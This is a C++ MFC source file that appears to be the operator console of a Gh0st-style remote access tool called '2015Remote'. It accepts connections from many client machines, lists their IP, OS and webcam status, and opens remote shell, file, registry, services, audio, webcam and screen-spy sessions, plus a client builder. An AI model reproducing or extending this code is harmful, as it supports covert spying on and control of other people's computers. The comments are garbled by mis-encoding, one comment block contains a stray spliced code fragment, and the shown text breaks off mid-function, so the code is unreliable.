
// RemoteDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "RemoteDlg.h"
#include "afxdialogex.h"
#include "resource.h"
#include "IOCPServer.h"
#include"SystemDlg.h"
#include "TalkDlg.h"
#include "ShellDlg.h"
#include "FileManagerDlg.h"
#include "AudioDlg.h"
#include "VideoDlg.h"
#include"ServicesDlg.h"
#include "RegisterDlg.h"
#include "ScreenSpyDlg.h"
#include "Common.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//ȫ�ֱ���
CRemoteDlg*  g_RemoteDlg = NULL;
static UINT Indicators[] =
{
	IDR_STATUSBAR_STRING
};
typedef struct
{
	char*   szTitle;           //�б������
	int		nWidth;            //�б�Ŀ��
}COLUMNSTRUCT;
COLUMNSTRUCT g_Column_Data_Online[] =
{
	{ "IP",			148 },
	{ "����",			150 },
	{ "�������/��ע",	160 },
	{ "����ϵͳ",		128 },
	{ "CPU",			80 },
	{ "����ͷ",		81 },
	{ "PING",			151 }
};
COLUMNSTRUCT g_Column_Data_Message[] =
{
	{ "��Ϣ����",		200 },
	{ "ʱ��",			200 },
	{ "��Ϣ����",	    490 }
};
enum
{
	ONLINELIST_IP = 0,          //IP����˳��
	ONLINELIST_ADDR,          //��ַ
	ONLINELIST_COMPUTER_NAME, //�������/��ע
	ONLINELIST_OS,            //����ϵͳ
	ONLINELIST_CPU,           //CPU
	ONLINELIST_VIDEO,         //����ͷ(����)
	ONLINELIST_PING           //PING(�Է�������)
};
int g_Column_Count_Message = 3;   //�б�ĸ���
int  g_Column_Count_Online = 7;
int g_Column_Online_Width = 0;
int g_Column_Message_Width = 0;

IOCPServer* m_IocpServer = NULL;


#define UM_ICONNOTIFY WM_USER+100     //���̻���Ϣ






// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnMainSet();
	
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
	ON_COMMAND(ID_MAIN_SET, &CAboutDlg::OnMainSet)
	
END_MESSAGE_MAP()


// CRemoteDlg �Ի���



CRemoteDlg::CRemoteDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_REMOTE_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	m_iCount = 0;

	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
	m_bmOnline[1].LoadBitmap(IDB_BITMAP_ONLINE);
}

void CRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_TIMER()
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconotify)
	ON_COMMAND(ID_NOTIFY_EXIT, &CRemoteDlg::OnNotifyExit)
	ON_COMMAND(IDM_NOTIFY_SHOW, &CRemoteDlg::OnNotifyShow)
	ON_COMMAND(ID_MAIN_SET, &CRemoteDlg::OnMainSet)
	ON_COMMAND(ID_MAIN_EXIT, &CRemoteDlg::OnMainExit)
	ON_WM_CLOSE()
	ON_COMMAND(IDM_ONLINE_BUILD, &CRemoteDlg::OnOnlineBuildClient)
//	ON_REGISTERED_MESSAGE(WM_USERTOONLINELIST, &CRemoteDlg::OnUsertoonlinelist)
	ON_MESSAGE(WM_USERTOONLINELIST, &CRemoteDlg::OnUsertoonlinelist)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CRemoteDlg::OnOnlineProcess)
	ON_MESSAGE(WM_OPENSYSTEMDIALOG, &CRemoteDlg::OnOpensystemdialog)
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CRemoteDlg::OnNMRClickOnline)
	ON_COMMAND(ID_ONLINE_MESSAGE, &CRemoteDlg::OnOnlineMessage)
	ON_MESSAGE(WM_OPENTALKDIALOG, &CRemoteDlg::OnOpentalkdialog)
	ON_COMMAND(ID_ONLINE_DELETE, &CRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_ONLINE_CMD, &CRemoteDlg::OnOnlineCmd)
	ON_MESSAGE(WM_OPENSHELLDIALOG, &CRemoteDlg::OnOpenshelldialog)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CRemoteDlg::OnOnlineWindowManager)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CRemoteDlg::OnOnlineDesktopManager)
	ON_COMMAND(IDM_ONLINE_FILE, &CRemoteDlg::OnOnlineFileManager)
	ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, &CRemoteDlg::OnOpenFileManagerDialog)
	
	ON_COMMAND(IDM_ONLINE_AUDIO, &CRemoteDlg::OnOnlineAudioManager)
	ON_MESSAGE(WM_OPENAUDIODIALOG, &CRemoteDlg::OnOpenaudiodialog)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CRemoteDlg::OnOnlineVideoManager)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, &CRemoteDlg::OnOpenVideoDialog)
	ON_COMMAND(IDM_ONLINE_SERVER, &CRemoteDlg::OnOnlineServerManager)
	ON_MESSAGE(WM_OPENSERVICESDIALOG, &CRemoteDlg::OnOpenServicesDialog)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CRemoteDlg::OnOnlineRegisterManager)
	ON_MESSAGE(WM_OPENREGISTERDIALOG, &CRemoteDlg::OnOpenrRegisterDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, &CRemoteDlg::OnOpenScreenspyDialog)
END_MESSAGE_MAP()


// CRemoteDlg ��Ϣ�������

BOOL CRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	g_RemoteDlg = this;
	//����������
	CreateToolBar();
	//��ʼ�������ڿؼ�
	InitControl();    
	//��ʼ��״̬��
	CreateStatusBar();
	//��������
	CreteNotifyBar();
	//�����˵�
	CreateSolidMenu();
	//����
	ListenPort();       //δ���





	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


/************************************************************************/
/*  CreateToolBar   ������ʹ�����                                                     */
/************************************************************************/
VOID CRemoteDlg::CreateToolBar()
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //����һ��������  ������Դ
	{
		
		return;
	}

	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);
	//������ʹ�����
	m_ToolBar.LoadTrueColorToolBar(
		48,    
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN);

	RECT Rect, RectMain;
	GetWindowRect(&RectMain);   //��ô��ڵĴ�С
	Rect.left = 0;
	Rect.top = 0;
	Rect.bottom = 80;
	Rect.right = RectMain.right - RectMain.left + 10;
	m_ToolBar.MoveWindow(&Rect, TRUE);
	m_ToolBar.SetButtonText(0, "�ն˹���");     //��λͼ����������ļ�
	m_ToolBar.SetButtonText(1, "���̹���");
	m_ToolBar.SetButtonText(2, "���ڹ���");
	m_ToolBar.SetButtonText(3, "�������");
	m_ToolBar.SetButtonText(4, "�ļ�����");
	m_ToolBar.SetButtonText(5, "��������");
	m_ToolBar.SetButtonText(6, "��Ƶ����");
	m_ToolBar.SetButtonText(7, "�������");
	m_ToolBar.SetButtonText(8, "ע������");
	m_ToolBar.SetButtonText(9, "��������");
	m_ToolBar.SetButtonText(10, "���ɿͻ���");
	m_ToolBar.SetButtonText(11, "����");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //��ʾ
	
}

/************************************************************************/
/*      ������ CreateStatusBar                                           */
/*       ���ã�����״̬��                                                */
/************************************************************************/
VOID CRemoteDlg::CreateStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(Indicators,
			sizeof(Indicators) / sizeof(UINT)))                    //����״̬���������ַ���Դ��ID
	{
		return;
	}
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom += 20;
	MoveWindow(rect);
}

/************************************************************************/
/*  ������CreteNotifyBar()                                             */
/*  ���ã���������                                                     */
/************************************************************************/
VOID CRemoteDlg::CreteNotifyBar()
{
	m_Nid.cbSize = sizeof(NOTIFYICONDATA);    //��С
	m_Nid.hWnd = m_hWnd;                      //�����ھ��  
	m_Nid.uID = IDR_MAINFRAME;                  //λͼID
	m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //������ӵ�е�״̬
	m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //�ص���Ϣ
	m_Nid.hIcon = m_hIcon;

	CString strTips = "2015RemoteԶ��Э�����.........";       //������ʾ
	lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //��ʾ����
}
VOID CRemoteDlg::CreateSolidMenu()
{
	HMENU hMenu;
	hMenu = LoadMenu(NULL, MAKEINTRESOURCE(IDR_MENU2));
	::SetMenu(this->GetSafeHwnd(), hMenu);
	::DrawMenuBar(this->GetSafeHwnd());
}
/************************************************************************/
/*        ����OnSize                                                              */
/************************************************************************/
void CRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������

	if (m_CList_Online.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;          //�б��������     
		rc.top = 80;         //�б��������
		rc.right = cx - 1;    //�б��������
		rc.bottom = cy - 160;   //�б��������
		m_CList_Online.MoveWindow(rc);


		for (int i = 0; i < g_Column_Count_Online; i++) //����ÿһ����
		{           
			double Temp = g_Column_Data_Online[i].nWidth;     //�õ���ǰ�еĿ��   138
			Temp /= g_Column_Online_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
			Temp *= cx;                                       //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
			int lenth = Temp;                               //ת��Ϊint ����
			m_CList_Online.SetColumnWidth(i, (lenth));       //���õ�ǰ�Ŀ��
		}
	}

	if (m_CList_Message.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;         //�б��������
		rc.top = cy - 156;     //�б��������
		rc.right = cx - 1;    //�б��������
		rc.bottom = cy - 20;   //�б��������
		m_CList_Message.MoveWindow(rc);
		for (int i = 0; i < g_Column_Count_Message; i++) {           //����ÿһ����
			double Temp = g_Column_Data_Message[i].nWidth;     //�õ���ǰ�еĿ��
			Temp /= g_Column_Message_Width;                    //��һ����ǰ���ռ�ܳ��ȵļ���֮��
			Temp *= cx;                                        //��ԭ���ĳ��ȳ�����ռ�ļ���֮���õ���ǰ�Ŀ��
			int lenth = Temp;                                  //ת��Ϊint ����
			m_CList_Message.SetColumnWidth(i, (lenth));        //���õ�ǰ�Ŀ��
		}
	}
	if (m_ToolBar.m_hWnd != NULL)                  //������
	{
		CRect rc;
		rc.top = rc.left = 0;
		rc.right = cx;
		rc.bottom = 80;
		m_ToolBar.MoveWindow(rc);             //���ù�������Сλ��
	}

	if (m_StatusBar.m_hWnd != NULL) 
	{    //���Ի����С�ı�ʱ ״̬����СҲ��֮�ı�
		CRect Rect;
		Rect.top = cy - 20;
		Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx - 10);
	}
}

/************************************************************************/
/*   ����InitControl                                               */
/*   ���ã���ʼ�������ڿؼ�                                       */
/************************************************************************/
VOID CRemoteDlg::InitControl()
{
	CRect Rect;
	GetWindowRect(&Rect);
	Rect.bottom += 20;
	MoveWindow(&Rect);

	for (INT i = 0; i < g_Column_Count_Online;i++)
	{
		m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle, LVCFMT_CENTER, g_Column_Data_Online[i].nWidth);
		g_Column_Online_Width += g_Column_Data_Online[i].nWidth;
	}

	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (int i = 0; i < g_Column_Count_Message; i++)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle, LVCFMT_CENTER, g_Column_Data_Message[i].nWidth);


		g_Column_Message_Width += g_Column_Data_Message[i].nWidth;
	}

	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	SetTimer(0, 3000, NULL);
}

/************************************************************************/
/* ����    ListenPort()                                                */
/*  ����   ��ü����˿ںź����������                                  */
/************************************************************************/
VOID CRemoteDlg::ListenPort()
{
	//��ü����˿ں�
	INT iPort = ((CRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");
	//������������
	INT iMaxConnection = ((CRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");
	if (iPort == 0)
	{
		iPort = 2356;
	}
	if (iMaxConnection == 0)
	{
		iMaxConnection = 10000;
	}
	Activate(iPort,iMaxConnection);
}
/************************************************************************/
/* ����    Activate                                                    */
/*  ���ã� �����ͻ��˵�����                                            */
/* ������iPort �˿ںţ�iMaxConnection ���������                       */
/************************************************************************/
VOID  CRemoteDlg::Activate(INT iPort, INT iMaxConnection)
{
	m_IocpServer = new IOCPServer;

	if (m_IocpServer == NULL)
	{
		return;

	}
	//��ʼ����
	if (m_IocpServer->StartServer(NotifyProc, iPort))
	{

	}
	CString strTemp;
	strTemp.Format("�����˿�: %d�ɹ�", iPort);
	ShowMessage(TRUE , strTemp);
}
/************************************************************************/
/* ��ʱ��������                                                                     */
/************************************************************************/
VOID CRemoteDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	switch (nIDEvent)
	{
		case 0:
		{
			//MessageBox("Hello", "Hello", NULL);
			break;
		}
		case 1:
		{
			break;
		}
	}
	CDialogEx::OnTimer(nIDEvent);
}

VOID CRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing, CONTEXT_OBJECT * ContextObject)
{
	int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), strIP);

	m_CList_Online.SetItemText(i, ONLINELIST_ADDR, strAddr);
	m_CList_Online.SetItemText(i, ONLINELIST_COMPUTER_NAME, strPCName);
	m_CList_Online.SetItemText(i, ONLINELIST_OS, strOS);
	m_CList_Online.SetItemText(i, ONLINELIST_CPU, strCPU);
	m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, strVideo);
	m_CList_Online.SetItemText(i, ONLINELIST_PING, strPing);

	m_CList_Online.SetItemData(i, (DWORD_PTR)ContextObject);
	ShowMessage(TRUE, strIP + "��������");
}

/************************************************************************/
/* ����:ShowMessage()  ��Ϣ��ʾ����                                     */
/************************************************************************/
VOID CRemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
{
	CString strIsOk, strTime;
	CTime Timer = CTime::GetCurrentTime();
	strTime = Timer.Format("%H:%M:%S");
	if (bOk)
	{
		strIsOk = "ִ�гɹ�";
	}
	else
	{
		strIsOk = "ִ��ʧ��";
	}
	m_CList_Message.InsertItem(0, strIsOk);    //��ؼ�����������
	m_CList_Message.SetItemText(0, 1, strTime);
	m_CList_Message.SetItemText(0, 2, strMsg);

	if (strMsg.Find("����") > 0)         //�������߻���������Ϣ
	{
		m_iCount++;
	}
	else if (strMsg.Find("����") > 0)
	{
		m_iCount--;
	}
	else if (strMsg.Find("�Ͽ�") > 0)
	{
		m_iCount--;
	}

	CString strStatusMsg;
	m_iCount = (m_iCount <= 0 ? 0 : m_iCount);         //��ֹiCount ��-1�����
	strStatusMsg.Format("��%d����������", m_iCount);
	
}
/****neText(0, strStatusMsg);   //��״̬������ʾ����
********************************************************************/
/* ����:NotifyProc()                                                    */
/************************************************************************/
VOID CALLBACK CRemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
{
	MessageHandle(ContextObject);
}

VOID CRemoteDlg::MessageHandle(CONTEXT_OBJECT * ContextObject)
{
	if (ContextObject == NULL)
	{
		return ;
	}
	if (ContextObject->v1 > 0)
	{
		switch (ContextObject->v1)
		{
			case SYSTEM_DLG:
			{
				CSystemDlg *Dlg = (CSystemDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case TALK_DLG:
			{
				CTalkDlg* Dlg = (CTalkDlg*)ContextObject->hDlg;
				Dlg->ShowWindow(SW_SHOW);
				break;
			}
			case SHELL_DLG:
			{
				CShellDlg *Dlg = (CShellDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();

				break;
			}
			case FILEMANAGER_DLG:
			{
				CFileManagerDlg *Dlg = (CFileManagerDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case AUDIO_DLG:
			{
				CAudioDlg *Dlg = (CAudioDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case VIDEO_DLG:
			{
				
				CVideoDlg *Dlg = (CVideoDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case SERVICES_DLG:
			{
				CServicesDlg *Dlg = (CServicesDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case REGISTER_DLG:
			{
				CRegisterDlg *Dlg = (CRegisterDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
			case SCREENSPY_DLG:
			{
				CScreenSpyDlg *Dlg = (CScreenSpyDlg*)ContextObject->hDlg;
				Dlg->OnReceiveComplete();
				break;
			}
		}

		return;
	}
	int a = ContextObject->InDeCompressedBuffer.GetBuffer(0)[0];
	switch (ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
		//����
		case TOKEN_LOGIN:
		{
			g_RemoteDlg->PostMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject);
			break;
		}
		//ϵͳ����
		case TOKEN_PSLIST:
		case TOKEN_WSLIST:
		{
			g_RemoteDlg->PostMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		//��ʱ��Ϣ
		case TOKEN_TALK_START:
		{
			g_RemoteDlg->PostMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_SHELL_START:
		{
			g_RemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_DRIVE_LIST:
		{
			g_RemoteDlg->PostMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_AUDIO_START:
		{
			g_RemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_WEBCAM_BITMAPINFO: 
		{
			g_RemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_SERVERLIST:
		{

			g_RemoteDlg->PostMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	
		case TOKEN_REGEDIT:
		{
			g_RemoteDlg->PostMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case TOKEN_BITMAPINFO:
		{
			g_RemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		default:
			break; 
	}
}

VOID CRemoteDlg::SendSeletedCommand(PBYTE szBuffer, ULONG ulLength)
{
	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	int a = GetLastError();
	while (Pos)
	{
		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
		int a = 0;
		m_IocpServer->OnClientPreSending(ContextObject, szBuffer, ulLength);

	}
}


/************************************************************************/
/* ���� OnIconotify()                                                   */
/*  ���ã� �������̵Ĳ˵�                                               */
/************************************************************************/
afx_msg LRESULT CRemoteDlg::OnIconotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
	{
		if (!IsWindowVisible())
		{
			ShowWindow(SW_SHOW);
		}
		else
		{
			ShowWindow(SW_HIDE);
		}
		break;
	}

	case WM_RBUTTONDOWN:
	{
		CMenu Menu;
		Menu.LoadMenu(IDR_MENU1);
		CPoint Point;
		GetCursorPos(&Point);
		SetForegroundWindow();   //���õ�ǰ����
		Menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
			Point.x, Point.y, this, NULL);

		break;
	}

	}
	return 0;
}

/************************************************************************/
/* ����OnNotifyExit()                                                  */
/* ���ã����̲˵��˳�                                                  */
/************************************************************************/
void CRemoteDlg::OnNotifyExit()
{
	// TODO: �ڴ���������������
	SendMessage(WM_CLOSE);
}

/************************************************************************/
/* ����OnNotifyShow()                                              */
/*  ���ã����̲˵���ʾ*/
/************************************************************************/
void CRemoteDlg::OnNotifyShow()
{
	// TODO: �ڴ���������������
	ShowWindow(SW_SHOW);
}


void CAboutDlg::OnMainSet()
{
	// TODO: �ڴ���������������
	
}

/************************************************************************/
/* ������OnMainSet()             �˵���Ϣ������                       */
/************************************************************************/
void CRemoteDlg::OnMainSet()
{
	// TODO: �ڴ���������������
	CSettingDlg SettingDlg;
	SettingDlg.DoModal();
}

/************************************************************************/
/* ������OnMainSet()             �˵���Ϣ������                       */
/************************************************************************/
void CRemoteDlg::OnMainExit()
{
	// TODO: �ڴ���������������
	SendMessage(WM_CLOSE);
}

/************************************************************************/
/* ����void CRemoteDlg::OnClose()  �رմ���                            */
/************************************************************************/
void CRemoteDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	KillTimer(0);
	if (::MessageBox(NULL, "�d(������)Bye~Bye~", "Remote", MB_OKCANCEL) == 1)
	{
		Shell_NotifyIcon(NIM_DELETE, &m_Nid);


		if (m_IocpServer != NULL)
		{
			delete m_IocpServer;
			m_IocpServer = NULL;
		}
		CDialogEx::OnClose();
	}
	
}


void CRemoteDlg::OnOnlineBuildClient()
{
	// TODO: �ڴ���������������
	CBuildDlg Dlg;
	Dlg.DoModal();
}


//afx_msg LRESULT CRemoteDlg::OnUsertoonlinelist(WPARAM wParam, LPARAM lParam)
//{
//	return 0;
//}


afx_msg LRESULT CRemoteDlg::OnUsertoonlinelist(WPARAM wParam, LPARAM lParam)
{
	CString strIp, strAddr, strPcName, strOS, strCPU, strVideo, strPing;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	if (ContextObject == NULL)
	{
		return -1;
	}
	CString strToolTipsText;
	try
	{
		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
		{
			return -1;
		}
		//�ÿͻ��˵���Ϣ
		LOGIN_INFOR* LoginInfor = (LOGIN_INFOR*)ContextObject->InDeCompressedBuffer.GetBuffer();
		sockaddr_in ClientAddr;
		memset(&ClientAddr, 0, sizeof(ClientAddr));
		int iClientAsddrLen = sizeof(ClientAddr);
		BOOL bOk = getpeername(ContextObject->ClientSocket, (SOCKADDR*)&ClientAddr, &iClientAsddrLen);

		strIp = inet_ntoa(ClientAddr.sin_addr);

		strPcName = LoginInfor->szPCName;

		switch (LoginInfor->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfor->OsVerInfoEx.dwMajorVersion <= 4)
				strOS = "WindowsNT";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0)
				strOS = "Windows2000";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 1)
				strOS = "WindowsXP";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 2)
				strOS = "Windows2003";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0)
				strOS = "WindowsVista";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 1)
				strOS = "Windows7";
			if (LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 2)
				strOS = "Windows8";
		}
		strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);

		//����
		strPing.Format("%d", LoginInfor->dwSpeed);



		strVideo = LoginInfor->bWebCamIsExist ? "��" : "��";



		AddList(strIp, strAddr, strPcName, strOS, strCPU, strVideo, strPing, ContextObject);
	}
	catch (...){}
	
}


void CRemoteDlg::OnOnlineProcess()
{
	// TODO: �ڴ���������������
	BYTE bToken = COMMAND_SYSTEM;
	SendSeletedCommand(&bToken, sizeof(BYTE));
}


afx_msg LRESULT CRemoteDlg::OnOpensystemdialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
	CSystemDlg* Dlg = new CSystemDlg(this, m_IocpServer, ContextObject);

	ContextObject->v1 = SYSTEM_DLG;
	ContextObject->hDlg = Dlg;
	//�����������ĶԻ���
	Dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);

	
	return 0;
}


void CRemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	CMenu Menu;
	Menu.LoadMenu(IDR_MENU_LIST_ONLINE);
	CMenu* SubMenu = Menu.GetSubMenu(0);

	CPoint Point;
	GetCursorPos(&Point);

	int iCount = SubMenu->GetMenuItemCount();

	if (m_CList_Online.GetSelectedCount() == 0)
	{
		for (int i = 0;i < iCount;i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //�˵�ȫ�����
		}
	}

	Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);


	*pResult = 0;
